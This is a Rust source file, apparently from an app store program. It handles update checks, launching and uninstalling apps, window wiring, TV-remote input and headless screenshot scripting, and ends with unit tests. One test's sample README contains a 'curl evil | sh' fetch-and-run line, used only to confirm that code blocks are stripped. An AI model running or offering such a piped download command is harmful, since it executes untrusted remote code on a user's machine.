        let apps: Vec<(AppId, String)> =
            self.state().library.iter().filter_map(|a| Some((AppId::parse(&a.id)?, a.version.clone()))).collect();
        if apps.is_empty() || store.get_checking_updates() {
            return;
        }
        store.set_checking_updates(true);
        let work_apps = apps.clone();
        self.job(
            move |app| app.catalog().check_updates(&work_apps),
            move |app, ui, statuses| {
                let available = statuses.iter().filter(|s| matches!(s, UpdateStatus::Available { .. })).count();
                let failed = statuses.iter().filter(|s| matches!(s, UpdateStatus::Unknown(_))).count();
                {
                    let mut updates = app.updates.lock().unwrap();
                    let state = app.state();
                    for ((id, _), status) in apps.iter().zip(statuses) {
                        let id = id.to_string();
                        // A version the user chose to skip is not announced again.
                        let skipped = state.installed(&id).map(|a| a.skipped_version.clone()).unwrap_or_default();
                        let status = match status {
                            UpdateStatus::Available { version, .. } if version == skipped => UpdateStatus::UpToDate,
                            other => other,
                        };
                        updates.insert(id, status);
                    }
                }
                app.last_checked.store(now_unix(), Ordering::SeqCst);
                ui.global::<Store>().set_checking_updates(false);
                app.refresh(ui);
                if announce {
                    let message = match (available, failed) {
                        (0, 0) => "Everything is up to date".to_string(),
                        (0, f) => format!("Couldn't check {}", plural(f, "app")),
                        (n, _) => format!("{} available", plural(n, "update")),
                    };
                    app.toast(ui, &message, available == 0 && failed > 0);
                }
            },
        );
    }

    /// Is there a newer release of the store itself with a file for this device? One
    /// request, and quiet: the answer appears in Settings.
    pub fn check_store_update(self: &Arc<Self>, ui: &AppWindow) {
        let _ = ui;
        let Some(id) = self.store_app.clone() else { return };
        self.job(
            move |app| app.catalog().check_update(&id, env!("CARGO_PKG_VERSION")),
            |_app, ui, status| {
                let version = match status {
                    UpdateStatus::Available { version, .. } => version,
                    // Up to date, nothing for this device, or could not be checked: say nothing.
                    _ => String::new(),
                };
                ui.global::<Store>().set_store_update(version.into());
            },
        );
    }

    /// Stop offering the update that is waiting for this app; the one after it is
    /// announced as usual.
    pub fn skip_update(&self, ui: &AppWindow, id: &str) {
        let waiting = self.updates.lock().unwrap().get(id).cloned();
        let Some(UpdateStatus::Available { version, .. }) = waiting else { return };
        let mut name = String::new();
        self.update_state(ui, |state| {
            if state.skip_version(id, &version) {
                name = state.installed(id).map(|a| a.name.clone()).unwrap_or_default();
            }
        });
        if name.is_empty() {
            return;
        }
        self.updates.lock().unwrap().insert(id.to_string(), UpdateStatus::UpToDate);
        self.refresh(ui);
        self.toast(ui, &format!("Skipping {name} {version}. You'll hear about the next one."), false);
    }

    /// The file to run for an app the store placed itself, if it is still there.
    fn launchable(&self, id: &str) -> Option<PathBuf> {
        let state = self.state.lock().unwrap();
        // A web app is opened by starting Longboard on its address.
        if id.starts_with("web:") {
            state.installed(id)?;
            return install::find_longboard(&self.dirs);
        }
        // A Flatpak is run by Flatpak, whoever installed it.
        if let Some(app_id) = id.strip_prefix("flathub:") {
            return bilby_core::source::flathub::is_installed(&self.dirs.flatpak_roots, app_id)
                .then(|| self.dirs.flatpak.clone());
        }
        let app = state.installed(id).filter(|a| a.store_managed)?;
        let path = PathBuf::from(app.path.as_deref()?);
        (path.starts_with(&self.dirs.applications) && path.is_file()).then_some(path)
    }

    /// Start the open app, when the store installed it as a file it can run.
    pub fn launch(&self, ui: &AppWindow) {
        let store = ui.global::<Store>();
        let id = store.get_app().id.to_string();
        let Some(path) = self.launchable(&id) else { return };
        let started = if let Some(host) = id.strip_prefix("web:") {
            (self.runner)(&path, &[format!("--url=https://{host}/")])
        } else if let Some(app_id) = id.strip_prefix("flathub:") {
            (self.runner)(&path, &["run".to_string(), app_id.to_string()])
        } else {
            (self.launcher)(&path)
        };
        match started {
            Ok(()) => self.toast(ui, &format!("Opening {}…", store.get_app().name), false),
            Err(e) => self.toast(ui, &format!("Couldn't open it: {e}"), true),
        }
    }

    /// Add the open app to the favourites, or take it out.
    pub fn toggle_favourite(&self, ui: &AppWindow) {
        let card = ui.global::<Store>().get_app();
        if AppId::parse(card.id.as_str()).is_none() {
            return;
        }
        let favourite = Favourite {
            id: card.id.to_string(),
            name: card.name.to_string(),
            author: card.author.to_string(),
            summary: card.summary.to_string(),
        };
        let mut added = false;
        self.update_state(ui, |state| added = state.toggle_favourite(favourite));
        self.refresh(ui);
        let message = if added { "Added to favourites. Find them in your library." } else { "Removed from favourites" };
        self.toast(ui, message, false);
    }

    pub fn remove_from_library(&self, ui: &AppWindow, id: &str) {
        let mut removed = None;
        self.update_state(ui, |state| removed = state.remove(id));
        let Some(entry) = removed else { return };
        self.updates.lock().unwrap().remove(id);
        let mut message = format!("{} removed from your library", entry.name);
        // Only files the store itself placed, and only inside its own Applications folder.
        if let (true, Some(path)) = (entry.store_managed, entry.path.as_deref()) {
            let path = PathBuf::from(path);
            if path.starts_with(&self.dirs.applications) && std::fs::remove_file(&path).is_ok() {
                message = format!("{} uninstalled", entry.name);
            }
        }
        // Whatever the store put in the app menu for it goes too (an AppImage, a web app).
        install::remove_menu_entry(&self.dirs, id);
        if id.starts_with("web:") {
            message = format!("{} removed from this TV's app list", entry.name);
        }
        // A Flatpak is removed by Flatpak; it carries on after this returns.
        if let Some(app_id) = id.strip_prefix("flathub:") {
            let args = ["uninstall", "--noninteractive", "--assumeyes", app_id].map(String::from);
            message = match (self.runner)(&self.dirs.flatpak, &args) {
                Ok(()) => format!("Uninstalling {}…", entry.name),
                Err(_) => {
                    format!("{} removed from your library. Flatpak could not be started to uninstall it.", entry.name)
                }
            };
        }
        let store = ui.global::<Store>();
        if store.get_app().id == id {
            store.set_installed_version(SharedString::new());
        }
        self.refresh(ui);
        self.toast(ui, &message, false);
    }
}

fn unix_date(secs: u64) -> String {
    // Reuse the AUR module's civil-date conversion through a tiny local copy.
    let z = (secs / 86_400) as i64 + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = yoe + era * 400 + i64::from(m <= 2);
    format!("{y:04}-{m:02}-{d:02}")
}

fn find_card(store: &Store, id: &str) -> Option<AppCard> {
    let in_sections = store.get_sections().iter().flat_map(|s| s.apps.iter().collect::<Vec<_>>()).find(|c| c.id == id);
    in_sections
        .or_else(|| store.get_results().iter().find(|c| c.id == id))
        .or_else(|| store.get_suggestions().iter().find(|c| c.id == id))
        .or_else(|| store.get_library().iter().map(|r| r.card).find(|c| c.id == id))
        .or_else(|| store.get_favourites().iter().find(|c| c.id == id))
}

/// Create the window and wire it to the catalog, without starting the event loop.
pub fn build(options: &Options) -> Result<(AppWindow, Arc<App>), Box<dyn std::error::Error>> {
    let mut platform = options.platform.clone().unwrap_or_else(Platform::detect);
    let detected = platform.form_factor;
    let dirs = options.dirs.clone().unwrap_or_else(Dirs::for_current_user);
    // The demo catalog gets its own library so fictional apps never mix with real ones.
    let state_path = options
        .state_file
        .clone()
        .unwrap_or_else(|| dirs.config.join(if options.demo { "demo-state.json" } else { "state.json" }));
    let state = State::load(&state_path);
    // Which layout: the command line first, then the choice saved in Settings, then
    // what the device looks like. The TV layout also means "prefer TV builds".
    match options.shell {
        Some(Shell::Tv) => platform.form_factor = FormFactor::Tv,
        Some(_) if platform.form_factor == FormFactor::Tv => platform.form_factor = FormFactor::Desktop,
        Some(_) => {}
        None => platform.form_factor = form_for(&state.settings.interface, detected),
    }
    // A controller with nothing else pointing at a TV: worth one question.
    let ask_tv = options.shell.is_none()
        && platform.form_factor == FormFactor::Desktop
        && state.settings.interface.is_empty()
        && !state.settings.asked_about_tv
        && options
            .controller
            .unwrap_or_else(|| options.platform.is_none() && bilby_core::platform::controller_attached());
    let demo = options.demo;
    let catalog_factory: CatalogFactory = options.catalog_factory.clone().unwrap_or_else(|| {
        Arc::new(move |platform: &Platform, settings: &Settings, dirs: &Dirs| {
            make_catalog(platform, demo, settings, dirs)
        })
    });
    let catalog = catalog_factory(&platform, &state.settings, &dirs);

    let ui = AppWindow::new()?;
    let store = ui.global::<Store>();
    let shell = options.shell.unwrap_or_else(|| shell_for(platform.form_factor));
    store.set_shell(shell);
    // A forced interface stays put; otherwise desktop and mobile follow the window width.
    store.set_adaptive(options.shell.is_none() && shell != Shell::Tv);
    store.set_ask_tv(ask_tv);
    store.set_demo(options.demo);
    store.set_app_version(env!("CARGO_PKG_VERSION").into());
    store.set_platform_title(platform.title().into());
    store.set_device_name(platform.friendly().into());
    let mut facts = platform.facts();
    let sources: Vec<_> = catalog.active_sources().iter().map(|s| s.label()).collect();
    facts.push(("Sources".to_string(), sources.join(", ")));
    store.set_facts(ModelRc::new(VecModel::from(
        facts.into_iter().map(|(name, value)| Fact { name: name.into(), value: value.into() }).collect::<Vec<_>>(),
    )));

    // A demo or a preview of another device must never look at, let alone change, the
    // real system: it gets a made-up one.
    let pretend = options.demo || options.platform.is_some();
    let host: Arc<dyn bilby_core::os::Host> = match &options.host {
        Some(host) => host.clone(),
        None if pretend => Arc::new(bilby_core::os::demo_host(&platform)),
        None => Arc::new(bilby_core::os::RealHost),
    };
    let mut system = bilby_core::os::describe(host.as_ref(), &platform);
    if pretend && !options.demo && options.host.is_none() {
        system.note = format!("This is a preview of another device, so these details are made up. {}", system.note);
    }

    let app = Arc::new(App {
        ui: ui.as_weak(),
        catalog: RwLock::new(catalog),
        platform: RwLock::new(platform),
        detected,
        theme_override: options.theme.clone(),
        inline: options.inline,
        dirs,
        state_path,
        state: Mutex::new(state),
        results: Mutex::new((String::new(), Vec::new())),
        updates: Mutex::new(HashMap::new()),
        last_checked: AtomicU64::new(0),
        current: Mutex::new(Current::default()),
        search_generation: AtomicU64::new(0),
        details_generation: AtomicU64::new(0),
        install_when_loaded: Mutex::new(None),
        toast_generation: Arc::new(AtomicU64::new(0)),
        cancel_install: Arc::new(AtomicBool::new(false)),
        store_app: match &options.store_app {
            Some(id) => AppId::parse(id),
            None if options.demo => None,
            None => Some(AppId::new(SourceKind::GitHub, bilby_core::catalog::STORE_REPOSITORY)),
        },
        update_queue: Mutex::new(std::collections::VecDeque::new()),
        pictures_requested: Mutex::new(HashSet::new()),
        opener: options.opener.clone().unwrap_or_else(|| Arc::new(install::open_with_system)),
        launcher: options.launcher.clone().unwrap_or_else(|| Arc::new(install::launch)),
        runner: options.runner.clone().unwrap_or_else(|| Arc::new(install::launch_with)),
        icon_urls: Mutex::new(HashMap::new()),
        catalog_factory,
        host,
        system,
        system_check: Mutex::new(None),
        collections: Mutex::new(Vec::new()),
        self_program: options.self_program.clone(),
    });
    app.apply_menu_entry(&ui);
    app.show_system(&ui, 0, "");

    // The TV interface is designed dark; elsewhere the saved preference applies.
    let theme = options.theme.clone().unwrap_or_else(|| app.state().settings.theme);
    ui.global::<Theme>().set_mode(if shell == Shell::Tv { 2 } else { theme_mode(&theme) });
    app.refresh(&ui);
    app.refresh_settings(&ui);
    app.load_pictures(&ui);
    app.load_collections(&ui);
    // Read the system's package databases in the background: it can take a moment on a
    // large distribution, and the first search should not be the one to pay for it.
    app.job(
        |app| app.catalog().system_repositories(),
        |_app, ui, repositories| {
            if repositories.is_empty() {
                return;
            }
            let store = ui.global::<Store>();
            let mut facts: Vec<Fact> = store.get_facts().iter().collect();
            facts.push(Fact { name: "System repositories".into(), value: repositories.join(", ").into() });
            store.set_facts(ModelRc::new(VecModel::from(facts)));
        },
    );
    if let Some(theme) = &options.theme {
        store.set_theme_mode(theme_mode(theme));
    }

    // Each handler looks the window up again: callbacks must not keep it alive.
    macro_rules! on {
        ($setter:ident, |$app:ident, $ui:ident $(, $arg:ident)*| $body:block) => {
            store.$setter({
                let $app = app.clone();
                move |$($arg),*| {
                    if let Some($ui) = $app.ui.upgrade() {
                        let $ui = &$ui;
                        $body
                    }
                }
            });
        };
    }
    on!(on_search, |app, ui, query| { app.search(ui, &query) });
    on!(on_typing, |app, ui, text| { app.typing(ui, &text) });
    on!(on_open, |app, ui, id| { app.open(ui, &id) });
    on!(on_close_details, |app, ui| { app.close_details(ui) });
    on!(on_retry_details, |app, ui| {
        let id = app.current.lock().unwrap().id.clone();
        if !id.is_empty() {
            app.open(ui, &id);
        }
    });
    on!(on_select_version, |app, ui, index| { app.select_version(ui, index) });
    on!(on_install, |app, ui, index| { app.install(ui, index) });
    on!(on_cancel_install, |app, ui| {
        let _ = ui;
        app.cancel_install.store(true, Ordering::SeqCst);
    });
    on!(on_check_updates, |app, ui| { app.check_updates(ui, true) });
    on!(on_update_app, |app, ui, id| { app.update_app(ui, &id) });
    on!(on_update_all, |app, ui| { app.update_all(ui) });
    on!(on_remove_from_library, |app, ui, id| { app.remove_from_library(ui, &id) });
    on!(on_skip_update, |app, ui, id| { app.skip_update(ui, &id) });
    on!(on_toggle_favourite, |app, ui| { app.toggle_favourite(ui) });
    on!(on_launch, |app, ui| { app.launch(ui) });
    on!(on_quick_install, |app, ui, id| { app.quick_install(ui, &id) });
    on!(on_download_hidden, |app, ui, index| { app.download_hidden(ui, index) });
    on!(on_set_theme, |app, ui, mode| {
        let name = ["system", "light", "dark"].get(mode as usize).copied().unwrap_or("system");
        app.update_state(ui, |state| state.settings.theme = name.to_string());
        if ui.global::<Store>().get_shell() != Shell::Tv {
            ui.global::<Theme>().set_mode(theme_mode(name));
        }
        app.refresh_settings(ui);
    });
    on!(on_set_prereleases, |app, ui, enabled| {
        app.update_state(ui, |state| state.settings.include_prereleases = enabled);
        app.rebuild_catalog();
        app.refresh_settings(ui);
    });
    on!(on_set_ratings, |app, ui, enabled| {
        app.update_state(ui, |state| state.settings.hide_ratings = !enabled);
        if enabled {
            app.load_ratings(ui);
        } else {
            app.catalog().drop_ratings();
            app.refresh(ui);
        }
        app.refresh_settings(ui);
    });
    on!(on_set_check_on_start, |app, ui, enabled| {
        app.update_state(ui, |state| state.settings.skip_update_check_on_start = !enabled);
        app.refresh_settings(ui);
    });
    on!(on_open_downloads, |app, ui| {
        let folder = app.dirs.downloads.clone();
        let result = std::fs::create_dir_all(&folder).map_err(Error::from).and_then(|_| (app.opener)(&folder));
        if let Err(e) = result {
            app.toast(ui, &format!("Couldn't open the downloads folder: {e}"), true);
        }
    });
    on!(on_save_token, |app, ui, token| {
        let token = token.trim().to_string();
        let cleared = token.is_empty();
        app.update_state(ui, |state| state.settings.github_token = token);
        app.rebuild_catalog();
        app.refresh_settings(ui);
        app.toast(ui, if cleared { "Token forgotten" } else { "Token saved on this device" }, false);
    });
    on!(on_clear_cache, |app, ui| {
        // Only the store's own cache folders, never a path from outside.
        let result = ["http", "icons"].iter().try_for_each(|name| {
            let folder = app.dirs.cache.join(name);
            if folder.exists() {
                std::fs::remove_dir_all(&folder)
            } else {
                Ok(())
            }
        });
        match result {
            Ok(()) => app.toast(ui, "Cached catalog data cleared", false),
            Err(e) => app.toast(ui, &format!("Couldn't clear the cache: {e}"), true),
        }
    });
    on!(on_clear_recent, |app, ui| {
        app.update_state(ui, |state| state.recent_searches.clear());
        app.refresh(ui);
    });
    on!(on_open_url, |app, ui, url| {
        if let Err(e) = install::open_url(&url) {
            app.toast(ui, &e.to_string(), true);
        }
    });
    on!(on_set_in_menu, |app, ui, shown| {
        app.update_state(ui, |state| state.settings.hide_from_menu = !shown);
        app.apply_menu_entry(ui);
        app.refresh_settings(ui);
    });
    on!(on_set_interface, |app, ui, mode| { app.set_interface(ui, mode) });
    on!(on_answer_tv, |app, ui, yes| {
        if yes {
            app.set_interface(ui, 2);
        } else {
            app.update_state(ui, |state| state.settings.asked_about_tv = true);
            ui.global::<Store>().set_ask_tv(false);
        }
    });
    on!(on_system_check, |app, ui| { app.check_system(ui, true) });
    on!(on_system_update, |app, ui| { app.update_system(ui) });
    on!(on_system_handoff_open, |app, ui| {
        if let Some(handoff) = &app.system.handoff {
            if let Err(e) = (app.opener)(std::path::Path::new(handoff.target)) {
                app.toast(ui, &e.to_string(), true);
            }
        }
    });
    on!(on_dismiss_welcome, |app, ui| {
        app.update_state(ui, |state| state.settings.welcomed = true);
        app.refresh_settings(ui);
    });
    on!(on_view_store_update, |app, ui| {
        // The store's own page is an app page like any other: same files, same checks.
        if let Some(id) = app.store_app.clone() {
            app.open(ui, &id.to_string());
        }
    });
    on!(on_dismiss_toast, |app, ui| {
        let _ = &app;
        ui.global::<Store>().set_toast(SharedString::new());
    });

    if let Some(page) = options.page {
        store.set_page(page);
    }
    Ok((ui, app))
}

/// Translate what a TV remote sends into keys the interface understands.
///
/// Slint passes on the keys of a keyboard, but drops the "Back" key that remotes and
/// media keyboards send, so pressing it did nothing. Here it becomes Escape, which every
/// page already treats as "back". "Select" becomes Return. In the TV layout the right
/// and "back" mouse buttons do the same, because air-mouse remotes send those for Back.
#[cfg(not(target_os = "android"))]
fn translate_remote_keys(ui: &AppWindow) {
    use slint::platform::{Key, WindowEvent};
    use slint::winit_030::winit::event::{ElementState, MouseButton, WindowEvent as Raw};
    use slint::winit_030::winit::keyboard::{Key as RawKey, NamedKey};
    use slint::winit_030::{EventResult, WinitWindowAccessor};
    let weak = ui.as_weak();
    ui.window().on_winit_window_event(move |window, event| {
        let on_tv = || weak.upgrade().is_some_and(|ui| ui.get_effective() == Shell::Tv);
        let (key, state) = match event {
            Raw::KeyboardInput { event, .. } => match &event.logical_key {
                RawKey::Named(NamedKey::BrowserBack | NamedKey::GoBack) => (Key::Escape, event.state),
                RawKey::Named(NamedKey::Select | NamedKey::Accept) => (Key::Return, event.state),
                _ => return EventResult::Propagate,
            },
            Raw::MouseInput { button: MouseButton::Right | MouseButton::Back, state, .. } if on_tv() => {
                (Key::Escape, *state)
            }
            _ => return EventResult::Propagate,
        };
        let text: SharedString = key.into();
        window.dispatch_event(match state {
            ElementState::Pressed => WindowEvent::KeyPressed { text },
            ElementState::Released => WindowEvent::KeyReleased { text },
        });
        EventResult::PreventDefault
    });
}

pub fn run(mut options: Options) -> Result<(), Box<dyn std::error::Error>> {
    // An AppImage says where its file is. A demo, a preview of another device or a
    // screenshot run is not a real start and adds nothing to the app menu.
    let real = !options.demo && options.platform.is_none() && options.screenshot.is_none();
    if real && cfg!(target_os = "linux") && options.self_program.is_none() {
        options.self_program = std::env::var_os("APPIMAGE").map(PathBuf::from).filter(|path| path.is_file());
    }
    let (ui, app) = build(&options)?;
    #[cfg(not(target_os = "android"))]
    translate_remote_keys(&ui);
    let store = ui.global::<Store>();
    if let Some((w, h)) = options.size {
        ui.window().set_size(slint::LogicalSize::new(w as f32, h as f32));
    } else if store.get_shell() == Shell::Tv && options.screenshot.is_none() {
        ui.window().set_fullscreen(true);
    }
    if let Some(query) = &options.search {
        store.set_query(query.as_str().into());
        app.search(&ui, query);
    }
    if let Some(target) = &options.open {
        let id = AppId::from_user_input(target).map(|id| id.to_string()).unwrap_or_else(|| target.clone());
        app.open(&ui, &id);
    }
    app.load_ratings(&ui);
    // Quietly look for updates at start-up (unless turned off): it is the reason to open
    // the store again.
    if !app.state().settings.skip_update_check_on_start {
        app.check_updates(&ui, false);
        app.check_store_update(&ui);
        app.check_system(&ui, false);
    }

    if let Some(path) = options.screenshot.clone() {
        screenshot_after_script(&ui, options.script.clone(), options.settle_ms, path, options.report.clone());
    }
    ui.run()?;
    Ok(())
}

/// Replays scripted input through the window exactly as real key presses and clicks
/// would arrive, one step every 250 ms, then saves a frame and quits. This is how the
/// interfaces are exercised headlessly (CI, documentation screenshots).
fn screenshot_after_script(
    ui: &AppWindow,
    script: Vec<String>,
    settle_ms: u64,
    path: PathBuf,
    report: Option<PathBuf>,
) {
    use slint::platform::{Key, PointerEventButton, WindowEvent};
    let settle = std::time::Duration::from_millis(if settle_ms == 0 { 600 } else { settle_ms });
    let weak = ui.as_weak();
    let mut steps = script.into_iter().filter(|s| !s.is_empty());
    let timer = std::rc::Rc::new(slint::Timer::default());
    let timer_handle = timer.clone();
    timer.start(slint::TimerMode::Repeated, std::time::Duration::from_millis(250), move || {
        let Some(ui) = weak.upgrade() else { return };
        let window = ui.window();
        let key = |text: SharedString| {
            window.dispatch_event(WindowEvent::KeyPressed { text: text.clone() });
            window.dispatch_event(WindowEvent::KeyReleased { text });
        };
        match steps.next() {
            Some(step) => match step.as_str() {
                "up" => key(Key::UpArrow.into()),
                "down" => key(Key::DownArrow.into()),
                "left" => key(Key::LeftArrow.into()),
                "right" => key(Key::RightArrow.into()),
                "ok" => key(Key::Return.into()),
                "back" => key(Key::Escape.into()),
                "tab" => key(Key::Tab.into()),
                "wait" => {}
                other => {
                    if let Some((x, y)) = other.strip_prefix("click:").and_then(|p| p.split_once(',')) {
                        let position = slint::LogicalPosition::new(x.parse().unwrap_or(0.0), y.parse().unwrap_or(0.0));
                        window.dispatch_event(WindowEvent::PointerMoved { position });
                        window
                            .dispatch_event(WindowEvent::PointerPressed { position, button: PointerEventButton::Left });
                        window.dispatch_event(WindowEvent::PointerReleased {
                            position,
                            button: PointerEventButton::Left,
                        });
                    } else if let Some(id) = other.strip_prefix("update:") {
                        ui.global::<Store>().invoke_update_app(id.into());
                    } else if let Some(index) = other.strip_prefix("install:") {
                        // The same callback the Install button calls; independent of layout.
                        ui.global::<Store>().invoke_install(index.parse().unwrap_or(0));
                    } else if let Some(text) = other.strip_prefix("text:") {
                        for c in text.chars() {
                            key(c.to_string().into());
                        }
                    } else {
                        eprintln!("unknown script step \"{other}\"");
                    }
                }
            },
            None => {
                timer_handle.stop();
                let weak = ui.as_weak();
                let path = path.clone();
                let report = report.clone();
                slint::Timer::single_shot(settle, move || {
                    let Some(ui) = weak.upgrade() else { return };
                    let result = ui.window().take_snapshot().map_err(|e| e.to_string()).and_then(|pixels| {
                        let file = std::fs::File::create(&path).map_err(|e| e.to_string())?;
                        let mut encoder =
                            png::Encoder::new(std::io::BufWriter::new(file), pixels.width(), pixels.height());
                        encoder.set_color(png::ColorType::Rgba);
                        encoder.set_depth(png::BitDepth::Eight);
                        let mut writer = encoder.write_header().map_err(|e| e.to_string())?;
                        writer.write_image_data(pixels.as_bytes()).map_err(|e| e.to_string())
                    });
                    if let Err(e) = result {
                        eprintln!("screenshot failed: {e}");
                    }
                    if let Some(report) = &report {
                        if let Err(e) = std::fs::write(report, describe(&ui)) {
                            eprintln!("report failed: {e}");
                        }
                    }
                    let _ = slint::quit_event_loop();
                });
            }
        }
    });
}

/// What the interface is showing, as `key=value` lines. Lets a script check the real,
/// threaded application from outside.
fn describe(ui: &AppWindow) -> String {
    let store = ui.global::<Store>();
    let shell = match ui.get_effective() {
        Shell::Desktop => "desktop",
        Shell::Mobile => "mobile",
        Shell::Tv => "tv",
    };
    let first_option = store.get_options().row_data(0).map(|o| o.label.to_string()).unwrap_or_default();
    [
        format!("shell={shell}"),
        format!("page={}", store.get_page()),
        format!("details_open={}", store.get_details_open()),
        format!("details_loading={}", store.get_details_loading()),
        format!("details_error={}", store.get_details_error()),
        format!("app={}", store.get_app().id),
        format!("options={}", store.get_options().row_count()),
        format!("first_option={first_option}"),
        format!("hidden={}", store.get_hidden().row_count()),
        format!("installed_version={}", store.get_installed_version()),
        format!("install_state={}", store.get_install_state()),
        format!("install_message={}", store.get_install_message()),
        format!("results={}", store.get_results().row_count()),
        format!("suggestions={}", store.get_suggestions().row_count()),
        format!("searching={}", store.get_searching()),
        format!("library={}", store.get_library().row_count()),
        format!("updates={}", store.get_updates_count()),
        format!("checking_updates={}", store.get_checking_updates()),
        format!("updating={}", store.get_updating_id()),
        format!("store_update={}", store.get_store_update()),
        format!("system={}", store.get_system_name()),
        format!("system_state={}", store.get_system_state()),
        format!("system_headline={}", store.get_system_headline()),
        format!("system_updates={}", store.get_system_updates().row_count()),
        format!("toast={}", store.get_toast()),
    ]
    .join("\n")
        + "\n"
}

/// Android entry point (NativeActivity / GameActivity via `android-activity`).
#[cfg(target_os = "android")]
#[no_mangle]
fn android_main(android_app: slint::android::AndroidApp) {
    let internal = android_app.internal_data_path().unwrap_or_else(std::env::temp_dir);
    let downloads = android_app.external_data_path().unwrap_or_else(|| internal.clone());
    slint::android::init(android_app).expect("Slint Android backend failed to start");
    let dirs = Dirs {
        downloads: downloads.join("downloads"),
        applications: internal.join("apps"),
        menu: internal.join("menu"),
        flatpak: internal.join("flatpak-program"),
        flatpak_roots: vec![internal.join("flatpak")],
        cache: internal.join("cache"),
        config: internal.join("config"),
    };
    if let Err(e) = run(Options { dirs: Some(dirs), ..Default::default() }) {
        eprintln!("bilby: {e}");
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn initials_from_names() {
        assert_eq!(initials("Tidewave"), "Ti");
        assert_eq!(initials("fern-launcher"), "Fl");
        assert_eq!(initials("bat"), "Ba");
        assert_eq!(initials("x"), "X");
        assert_eq!(initials(""), "?");
    }

    #[test]
    fn notes_lose_their_markdown() {
        assert_eq!(plain_notes("## New\n\n- **Fast** `startup`\n* Fixes"), "New\n\n•  Fast startup\n•  Fixes");
    }

    #[test]
    fn notes_keep_their_words_and_lose_their_plumbing() {
        let notes = "<!-- generated -->\r\n# What's Changed\r\n\r\n\r\n* Fix crash by [@someone](https://github.com/someone) in [#12](https://github.com/a/b/pull/12)\r\n  - nested __point__\r\n\r\n![screenshot](https://example.com/x.png)\r\n\r\n---\r\n<details><summary>More</summary>\r\n\r\nSee <https://example.com/changelog> if a < b.\r\n</details>\r\n**Full Changelog**: https://github.com/a/b/compare/v1...v2";
        assert_eq!(
            plain_notes(notes),
            "What's Changed\n\n•  Fix crash by @someone in #12\n  •  nested point\n\nMore\n\nSee https://example.com/changelog if a < b.\n\nFull Changelog: https://github.com/a/b/compare/v1...v2"
        );
        assert_eq!(plain_notes(""), "");
        assert_eq!(plain_notes("[unclosed link and <odd"), "[unclosed link and <odd");
        assert_eq!(plain_notes("snake_case_name and 2 * 3"), "snake_case_name and 2 * 3");
        // Very long notes are cut, not dumped.
        let long = "word ".repeat(5000);
        assert!(plain_notes(&long).chars().count() < 30_000);
        assert!(plain_notes(&"line\n".repeat(5000)).ends_with('…'));
    }

    #[test]
    fn options_parse() {
        let args = ["--demo", "--ui", "tv", "--size", "1920x1080", "--as", "android-tv", "--page", "library"];
        let o = Options::from_args(args.map(String::from).into_iter()).unwrap();
        assert!(o.demo);
        assert_eq!(o.shell, Some(Shell::Tv));
        assert_eq!(o.size, Some((1920, 1080)));
        assert_eq!(o.page, Some(2));
        assert!(Options::from_args(["--ui", "watch"].map(String::from).into_iter()).is_err());
        assert!(Options::from_args(["--theme", "pink"].map(String::from).into_iter()).is_err());
        assert!(Options::from_args(["--page", "nowhere"].map(String::from).into_iter()).is_err());
    }

    #[test]
    fn dates_and_tints_are_stable() {
        assert_eq!(unix_date(1_700_000_000), "2023-11-14");
        assert_eq!(tint_for("github:a/b"), tint_for("github:a/b"));
    }

    #[test]
    fn a_readme_becomes_a_short_plain_description() {
        let readme = "<p align=\"center\"><img src=\"logo.png\"></p>\n\n# Thing\n\n[![build](b.svg)](ci)\n\nThing does **one** job well.\n\n## Install\n\n```sh\ncurl evil | sh\n```\n\n| a | b |\n|---|---|\n\n- Fast\n- See the [docs](https://x.invalid)\n";
        let about = plain_about(readme);
        assert_eq!(about, "Thing does one job well.\n\nInstall\n\n•  Fast\n•  See the docs");
        let long = format!("# T\n\n{}", "A sentence of filler text here.\n\n".repeat(80));
        let cut = plain_about(&long);
        assert!(
            cut.chars().count() <= 902 && cut.ends_with("here.\n…"),
            "cut at a line end: {:?}",
            &cut[cut.len() - 20..]
        );
        assert_eq!(plain_about(""), "");
    }
}
